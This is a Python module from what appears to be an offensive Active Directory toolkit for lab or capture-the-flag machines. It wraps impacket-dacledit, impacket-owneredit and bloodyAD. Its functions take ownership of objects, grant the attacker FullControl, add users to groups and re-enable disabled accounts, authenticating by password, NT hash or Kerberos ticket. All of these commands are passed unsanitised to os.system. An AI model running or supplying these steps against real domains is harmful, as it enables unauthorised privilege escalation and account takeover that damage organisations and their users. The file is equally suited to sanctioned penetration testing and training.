import os
import config

def list_acl(box, path):
    config.required_creds(box)
    config.required_target(box)
    os.chdir(path.ws_enum)
    print('\033[93m[*]\033[0m List ACL')
    if box.krb:
        cmd = f"{box.krb} impacket-dacledit {box.domain}/{box.username} -k -no-pass -principal {box.username} -target {box.target}"
    elif box.nt_hash:
        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -principal {box.username} -target {box.target}"
    else:
        cmd = f"impacket-dacledit {box.domain}/{box.username}:'{box.password}' -target {box.target} -principal {box.username}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd + f' 2>&1 | tee acl_{box.username}_to_{box.target}.out')
    print('\033[92m[+]\033[0m List ACL\n')

def read_write_owner(box, action):
    config.required_creds(box)
    config.required_target(box)
    print(f'\033[93m[*]\033[0m {action} owner')
    if box.krb:
        cmd = f"{box.krb} impacket-owneredit {box.domain}/{box.username} -k -no-pass -action {action} -new-owner {box.username} -target {box.target}"
    elif box.nt_hash:
        cmd = f"impacket-owneredit {box.domain}/{box.username} -hashes :{box.nt_hash} -action {action} -new-owner {box.username} -target {box.target}"
    else:
        cmd = f"impacket-owneredit {box.domain}/{box.username}:'{box.password}' -action {action} -new-owner {box.username} -target {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print(f'\033[92m[+]\033[0m {action} owner\n')

def dacledit(box):
    config.required_creds(box)
    config.required_target(box)
    print(f'\033[93m[*]\033[0m dacledit FullControl')
    if box.krb:
        cmd = f"{box.krb} impacket-dacledit {box.domain}/{box.username} -k -no-pass -action write -rights FullControl -principal {box.username} -target {box.target}"
    elif box.nt_hash:
        cmd = f"impacket-dacledit {box.domain}/{box.username} -hashes :{box.nt_hash} -action write -rights FullControl -principal {box.username} -target {box.target}"
    else:
        cmd = f"impacket-dacledit {box.domain}/{box.username}:'{box.password}' -action write -rights FullControl -principal {box.username} -target {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m dacledit FullControl\n')

def add_user_to_group(box):
    config.required_creds(box)
    config.required_targetgroup(box)
    print(f'\033[93m[*]\033[0m Add user to group')
    #cmd = f"impacket-net {box.domain}/{box.username}:'{box.password}'@{box.fqdn} group -name '{box.targetgroup}' -join {box.target}"
    if not box.target:
        print(f'\033[94m[!]\033[0m Use username as target!')
        box.target = box.username
    if box.krb:
        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -k add groupMember {box.targetgroup} {box.target}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} add groupMember {box.targetgroup} {box.target}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p '{box.password}' add groupMember {box.targetgroup} {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m Add user to group\n')

def list_user_to_group(box):
    print(f'\033[93m[*]\033[0m List users in group')
    #cmd = f"impacket-net {box.domain}/{box.username}:'{box.password}'@{box.fqdn} group -name '{box.targetgroup}'"
    if not box.target:
        print(f'\033[94m[!]\033[0m Use username as target!')
        box.target = box.username
    if box.krb:
        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -k get membership {box.target}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} get membership {box.target}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p '{box.password}' get membership {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m List users in group\n')

def remove_user_to_group(box):
    config.required_targetgroup(box)
    print(f'\033[93m[*]\033[0m Remove user from group')
    #cmd = f"impacket-net {box.domain}/{box.username}:'{box.password}'@{box.fqdn} group -name '{box.targetgroup}' -unjoin {box.target}"
    if not box.target:
        print(f'\033[94m[!]\033[0m Use username as target!')
        box.target = box.username
    if box.krb:
        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -k remove groupMember {box.targetgroup} {box.target}"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} remove groupMember {box.targetgroup} {box.target}"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p '{box.password}' remove groupMember {box.targetgroup} {box.target}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m Remove user from group\n')

def activate_account(box):
    config.required_target(box)
    print(f'\033[93m[*]\033[0m Activate account')
    if box.krb:
        cmd = f"{box.krb} bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p -k remove uac {box.target} -f ACCOUNTDISABLE"
    elif box.nt_hash:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p :{box.nt_hash} remove uac {box.target} -f ACCOUNTDISABLE"
    else:
        cmd = f"bloodyAD --host {box.fqdn} -d {box.domain} -u {box.username} -p '{box.password}' remove uac {box.target} -f ACCOUNTDISABLE"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m Activate account\n')
